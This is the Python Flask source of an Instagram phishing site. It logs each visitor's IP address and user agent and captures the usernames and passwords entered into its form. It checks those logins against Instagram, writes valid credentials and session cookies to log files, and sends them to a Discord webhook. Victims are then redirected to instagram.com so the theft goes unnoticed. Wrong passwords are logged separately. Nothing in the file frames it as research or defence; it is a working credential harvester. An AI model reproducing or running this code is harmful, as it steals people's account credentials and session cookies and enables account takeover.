from flask import Flask, render_template, request, redirect, url_for
from datetime import datetime
import pytz
import requests
import json
from dotenv import load_dotenv
import os
from gevent.pywsgi import WSGIServer
import gevent
from app.instagram_api import IsExists
from app.functions import set_agent,edit_cookies

app = Flask(__name__)
load_dotenv()

DISCORD_WEBHOOK_URL = os.getenv('DISCORD_WEBHOOK_URL')


def send_to_discord(message):
    data = {
        "content": "```\n" + message + "```"
    }
    headers = {
        'Content-Type': 'application/json',
    }
    try:
        response = requests.post(DISCORD_WEBHOOK_URL, data=json.dumps(data), headers=headers)
        response.raise_for_status() 
        print(f"Discord webhook response: {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"Error sending message to Discord: {e}")


@app.route('/')
def index():
    user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_agent = request.headers.get('User-Agent')

    utc_now = datetime.utcnow()
    baku_tz = pytz.timezone('Asia/Baku')
    baku_now = utc_now.replace(tzinfo=pytz.utc).astimezone(baku_tz)
    visit_time = baku_now.strftime("%Y-%m-%d %H:%M:%S")
    MESSAGE = "\nEnter website in: " + visit_time + "IP: " + user_ip + "User-Agent: " + user_agent
    print(f"Enter website in: {visit_time} \nIP: {user_ip}\nUser-Agent: {user_agent}\n")
    with open('output/ip_agent.log', 'a') as f:
        f.write(f"\n\n\n\nEnter website in: {visit_time} \nIP: {user_ip}\nUser-Agent: {user_agent}\n")
    
    return render_template('index.html')


@app.route('/submit', methods=['POST'])
def submit():
    
    username = request.form['username']
    password = request.form['password']

    user_agent = set_agent()
    
    result,cookies = IsExists(username, password, user_agent)    

    if result and result.get("status") == "ok" and result.get("authenticated") is not None and result.get("authenticated"):
        cookies = edit_cookies(cookies)

        with open('output/pass_user.log', 'a') as f:
            f.write(f"\nUsername: {username}\nPassword: {password}\n{cookies}\n")

        message = "Username: " + username + "\nPassword: " + password + "\n" + cookies
        gevent.spawn(send_to_discord, message)

        return redirect("http://www.instagram.com")
        
    else:
        with open('output/wrong_pass.log', 'a') as f:
            f.write(f"\nUsername: {username}\nPassword: {password}\n")
        return render_template('error.html')


if __name__ == '__main__':
    http_server = WSGIServer(('127.0.0.1', 8080), app)
    http_server.serve_forever()